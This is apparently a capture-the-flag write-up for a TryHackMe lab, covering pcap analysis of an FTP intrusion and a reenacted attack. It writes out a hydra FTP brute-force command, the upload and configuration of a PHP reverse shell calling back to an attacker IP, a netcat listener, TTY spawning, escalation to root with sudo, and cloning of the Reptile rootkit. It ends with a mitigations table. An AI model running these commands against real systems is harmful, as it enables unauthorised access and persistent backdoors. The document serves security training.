[h4cked](https://tryhackme.com/room/h4cked)


**Difficulty:** Easy 

**Objective:** Analyze attacker activity via .pcap file, then perform a live FTP brute-force, reverse shell deployment, and root-level privilege escalation.

---

## Table of Contents  
- [1. Summary](#1-summary)  
- [2. Methodology](#2-methodology)  
- [3. Reconnaissance](#3-reconnaissance)  
- [4. Enumeration](#4-enumeration)  
- [5. Exploitation](#5-exploitation)  
- [6. Privilege Escalation](#6-privilege-escalation)  
- [7. Post Exploitation](#7-post-exploitation)  
- [8. Flags / Proof](#8-flags--proof)  
- [9. Mitigations](#9-mitigations)  
- [10. Notes](#10-notes)

---

## 1. Summary  
**IP/URL:** 10.10.60.59  
**Services:** FTP (21), Web (80)  
**Entry Point:** FTP brute-force with known username  
**Privilege Escalation:** Reptile backdoor + sudo root shell  
**Outcome:** Retrieved root flag via custom kernel module backdoor

---

## 2. Methodology  
Following the PTES (Penetration Testing Execution Standard):  
1. Network Forensics Analysis  
2. Brute-force  
3. Exploitation (reverse shell)  
4. Privilege Escalation  
5. Flag capture

---

## 3. Reconnaissance  
**Analyzing .pcap in Wireshark:**  
- Initial SYN and SYN,ACK packets — missing ACK: indicates stealth scan  
- Banner grab: 220 Hello FTP world!  
- Brute-force attempt on FTP using user `jenny` and various passwords  
- Successful login:  
  USER jenny  
  PASS password123  
  230 Login successful  
- FTP Commands logged:  
  PWD → /var/www/html  
  STOR shell.php → uploads PHP reverse shell  
  SITE CHMOD 777 shell.php → makes file executable  
  QUIT

**Backdoor source identified via FTP_DATA stream:**  
http://pentestmonkey.net/tools/php-reverse-shell

**Shell commands traced:**  
- whoami  
- python3 -c 'import pty; pty.spawn("/bin/bash")'  
- su jenny  
- sudo su  
- git clone https://github.com/f0rb1dd3n/Reptile.git  
- make (fails due to missing config)

---

## 4. Enumeration  
**Hydra FTP brute-force:**  
hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.10.60.59  
Found: jenny / 987654321

**Manual FTP login:**  
ftp jenny@10.10.60.59  
Login successful  
Uploaded reverse shell:  
ftp> put shell.php

---

## 5. Exploitation  
**Reverse shell setup:**  
Set IP and port in `shell.php`:  
$ip = '10.10.188.88';  
$port = 8000;

Started listener:  
nc -lvnp 8000  
Executed via curl:  
curl http://10.10.60.59/shell.php  
Received shell as www-data  
Spawned TTY:  
python3 -c 'import pty; pty.spawn("/bin/bash")'

---

## 6. Privilege Escalation  
**Switched to user jenny:**  
su jenny  
Password: 987654321

**Escalated to root:**  
sudo su

**Enumerated directories:**  
cd Reptile  
Found backdoor source code and flag

---

## 7. Post Exploitation  
Navigated to `/root/Reptile`  
Located and read final flag:  
cat flag.txt

---

## 8. Flags / Proof  
User Flag: Retrieved via Wireshark FTP stream and manual FTP login  

Root Flag: Located in `/root/Reptile/flag.txt`

---

## 9. Mitigations  
| Vulnerability              | Risk   | Suggested Mitigation                          |  
|---------------------------|--------|-----------------------------------------------|  
| Weak FTP credentials      | High   | Enforce strong password policy                |  
| FTP anonymous access      | High   | Disable or restrict FTP entirely              |  
| Exposed web shells        | Critical | Monitor for suspicious uploads and traffic    |  
| Sudo misconfig for user   | High   | Restrict root access and audit sudo config    |  
| Kernel backdoors          | Critical | Monitor for unauthorized modules and source   |

---

## 10. Notes  
Time spent: ~1 hour  

Tools used: Wireshark, hydra, ftp, nc, python3, curl, git  

Lessons learned: Forensics can reveal full TTPs, including usernames, commands, and payloads. FTP is a common weak point. TTY and privilege escalation remain vital to full compromise.
